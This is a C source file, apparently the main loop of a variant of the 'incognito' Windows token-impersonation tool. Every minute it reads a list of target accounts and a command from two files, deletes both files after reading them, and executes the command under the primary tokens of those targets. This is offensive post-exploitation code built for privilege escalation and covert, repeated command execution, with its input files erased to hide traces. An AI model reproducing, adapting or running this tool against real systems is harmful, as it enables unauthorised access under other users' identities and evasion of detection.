#define _CRT_SECURE_NO_DEPRECATE 1
#include <stdio.h>
#include <assert.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include "handle_arguments.h"
#include "token_info.h"
#include "list_tokens.h"
#include "process_execution.h"

void usage(char*);

DWORD get_command_from_file(char* command_file, char* command_contents, DWORD buffer_size) {
	HANDLE fh = CreateFile(
		command_file,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (fh == INVALID_HANDLE_VALUE) {
		return 0;
	}
	DWORD bytes_read = 0;
	ReadFile(fh, command_contents, buffer_size - 1, &bytes_read, NULL);
	CloseHandle(fh);
	DeleteFile(command_file);
	return bytes_read;
}

DWORD get_targets_from_file(char* target_file, char** targets, DWORD buffer_size) {
	HANDLE fh = CreateFile(
		target_file,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (fh == INVALID_HANDLE_VALUE) {
		return 0;
	}
	char* target_contents = (char*)calloc(BUF_SIZE, sizeof(char));
	DWORD bytes_read = 0;
	if (!ReadFile(fh, target_contents, BUF_SIZE - 1, &bytes_read, NULL)) {
		CloseHandle(fh);
		return 0;
	}
	CloseHandle(fh);
	DeleteFile(target_file);
	char delim[] = "\r\n";
	char* ptr = strtok(target_contents, delim);
	DWORD num_of_targets = 0;
	while (ptr != NULL) {
		targets[num_of_targets] = ptr;
		num_of_targets++;
		ptr = strtok(NULL, delim);
	}	
	return num_of_targets;
}

int main(int argc, char *argv[])
{
	// usage: incognito.exe <file containing targets> <file containing command>
	if (argc != 3) {
		return 0;
	}
	
	// variables
	char* target_file = argv[1];
	char* command_file = argv[2];
	char* targets[BUF_SIZE];
	char command_contents[BUF_SIZE] = "";
	DWORD num_of_targets, bytes_read = 0;
	
	while (TRUE) {
		num_of_targets = get_targets_from_file(target_file, targets, BUF_SIZE);
		get_command_from_file(command_file, command_contents, BUF_SIZE);
		if (num_of_targets > 0) {			
			execute_process_with_primary_token(targets, num_of_targets, command_contents, TRUE);
		}
		Sleep(60000);
	}	
	exit(0);
}
